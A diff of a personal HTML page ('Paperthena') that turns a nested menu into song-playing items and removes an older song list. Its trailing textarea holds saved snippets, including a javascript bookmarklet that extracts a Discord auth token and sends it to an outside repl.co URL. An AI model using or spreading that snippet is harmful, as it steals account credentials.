@@ -18,22 +18,27 @@ body { background-image: url("background2.jpg"); } }
 .main_menu ul { list-style-type: none; }
 .main_menu ul li ul { flex-direction: column; display: none; }
 .main_menu ul li:hover > ul { display: flex; }
-.main_menu ul { padding: 3%; background-color: black; color: white; }
+.main_menu ul { background-color: black; color: white; }
 </style>
 
-<div class="main_menu" style="width: 20%;">
+<div class="main_menu" style="width: 25%;">
 <ul style="justify-content: space-between; display: flex;">
-<li>T1</li>
-<li>T2</li>
-<li>T3
+<li onclick="play_music('shinunoga')">Shinunoga E-Wa</li>
+<li onclick="play_music('lemon')">Lemon</li>
+<li onclick="play_music('night')">Night Dancer
 <ul style= "line-height: 4vh">
-<li>T4</li>
-<li>T5</li>
-<li>T6
-<ul style="width: 10%; justify-content: space-between;">
-<li>T7</li>
-<li>T8</li>
-<li>T9</li></ul></li>
+<li onclick="play_music('tsumi')">Tsumi No Kaori</li>
+<li onclick="play_music('matsuri')">Matsuri</li>
+<li onclick="play_music('kaerou')">Kaerou
+<ul style="width: 80%; justify-content: space-between;">
+<li onclick="play_music('yasashisa')">Yasashisa</li>
+<li onclick="play_music('metronome')">Metronome</li>
+<li onclick="play_music('shunrai')">Shunrai</li>
+<li onclick="play_music('uma')">Uma to Shika</li>
+<li onclick="play_music('orion')">Orion</li>
+<li onclick="play_music('eine')">Eine Kleine</li>
+<li onclick="play_music('haiiro')">Haiiro to Ao</li>
+<li onclick="play_music('loser')">Loser</li></ul></li>
 </ul></li></ul></div>
 
 <h1 onclick="hide_music()"><i id="auto_type_p">Paperthena</i></h1>
@@ -68,21 +73,6 @@ body { background-image: url("background2.jpg"); } }
 
 <div id="home"></div>
 <div id="result"></div>
-
-<span onclick="play_music('yasashisa')">Yasashisa</span>
-<span onclick="play_music('kaerou')">Kaerou</span>
-<span onclick="play_music('shinunoga')">Shinunoga E-Wa</span>
-<span onclick="play_music('matsuri')">Matsuri</span>
-<span onclick="play_music('tsumi')">Tsumi No Kaori</span>
-<span onclick="play_music('night')">Night Dancer</span>
-<span onclick="play_music('lemon')">Lemon</span>
-<span onclick="play_music('metronome')">Metronome</span>
-<span onclick="play_music('loser')">Loser</span>
-<span onclick="play_music('shunrai')">Shunrai</span>
-<span onclick="play_music('uma')">Uma to Shika</span>
-<span onclick="play_music('orion')">Orion</span>
-<span onclick="play_music('eine')">Eine Kleine</span>
-<span onclick="play_music('haiiro')">Haiiro to Ao</span>
 
 <div id="music_position"></div>
 
@@ -139,7 +129,7 @@ pointer-events: auto;
 border: none;
 outline: none;
 -->
-<input type="checkbox" id="hide" checked><label for="hide" id="playing_indicator" style="display: none;">Hide</label>
+<input type="checkbox" id="hide" unchecked><label for="hide" id="playing_indicator" style="display: none;">Hide</label>
 <textarea class="auto_resize">client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
